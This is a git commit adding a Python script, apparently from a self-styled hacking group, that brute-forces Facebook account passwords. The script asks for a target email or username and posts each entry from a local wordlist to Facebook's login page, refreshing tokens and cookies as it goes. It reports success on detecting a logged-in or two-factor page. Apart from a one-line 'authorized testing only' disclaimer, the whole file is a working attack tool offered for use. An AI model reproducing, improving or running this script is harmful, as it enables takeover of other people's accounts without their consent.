1fef643c09befea369bdaa27bed351f3bb84f25c
AriyanBinBappy <ariyanbinbappy2367@gmail.com>
2025-06-11 06:38:59 -0400

    Add files via upload

---
+++ facebook.py
@@ -0,0 +1,86 @@
+import os.path
+import requests
+from bs4 import BeautifulSoup
+import sys
+
+def print_banner():
+    banner = r"""
+  ___       _          ____             _       ____      _               
+ / _ \  ___| |_ ___   |  _ \  __ _ _ __| | __  / ___|   _| |__   ___ _ __ 
+| | | |/ __| __/ _ \  | | | |/ _` | '__| |/ / | |  | | | | '_ \ / _ \ '__|
+| |_| | (__| || (_) | | |_| | (_| | |  |   <  | |__| |_| | |_) |  __/ |   
+ \___/ \___|\__\___/  |____/ \__,_|_|  |_|\_\  \____\__, |_.__/ \___|_|   
+                                                    |___/                 
+ ____                            _ 
+/ ___|  __ _ _   _  __ _ _ __ __| |
+\___ \ / _` | | | |/ _` | '__/ _` |
+ ___) | (_| | |_| | (_| | | | (_| |
+|____/ \__, |\__,_|\__,_|_|  \__,_|
+          |_|                      
+
+    🛠️  Octo Dark Cyber Squad Facebook Bruteforce Tool
+    👤 Made by: Ariyan Bin Bappy
+    ☠️  Group: Octo Dark Cyber Squad
+    ⚠️  For authorized testing only 
+"""
+    print(banner)
+
+# Python 3 check
+if sys.version_info[0] != 3:
+    print('''\t--------------------------------------
+\tREQUIRED PYTHON 3.x
+\tinstall and try: python3 fb.py
+\t--------------------------------------''')
+    sys.exit()
+
+print_banner()
+
+PASSWORD_FILE = "passwords.txt"
+MIN_PASSWORD_LENGTH = 6
+POST_URL = 'https://www.facebook.com/login.php'
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+}
+PAYLOAD = {}
+COOKIES = {}
+
+def create_form():
+    form = dict()
+    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
+
+    data = requests.get(POST_URL, headers=HEADERS)
+    for i in data.cookies:
+        cookies[i.name] = i.value
+    data = BeautifulSoup(data.text, 'html.parser').form
+    if data.input['name'] == 'lsd':
+        form['lsd'] = data.input['value']
+    return form, cookies
+
+def is_this_a_password(email, index, password):
+    global PAYLOAD, COOKIES
+    if index % 10 == 0:
+        PAYLOAD, COOKIES = create_form()
+        PAYLOAD['email'] = email
+    PAYLOAD['pass'] = password
+    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+        open('temp', 'w').write(str(r.content))
+        print('\npassword found is: ', password)
+        return True
+    return False
+
+if __name__ == "__main__":
+    print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    if not os.path.isfile(PASSWORD_FILE):
+        print("Password file is not exist: ", PASSWORD_FILE)
+        sys.exit(0)
+    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
+    print("Password file selected: ", PASSWORD_FILE)
+    email = input('Enter Email/Username to target: ').strip()
+    for index, password in zip(range(password_data.__len__()), password_data):
+        password = password.strip()
+        if len(password) < MIN_PASSWORD_LENGTH:
+            continue
+        print("Trying password [", index, "]: ", password)
+        if is_this_a_password(email, index, password):
+            break
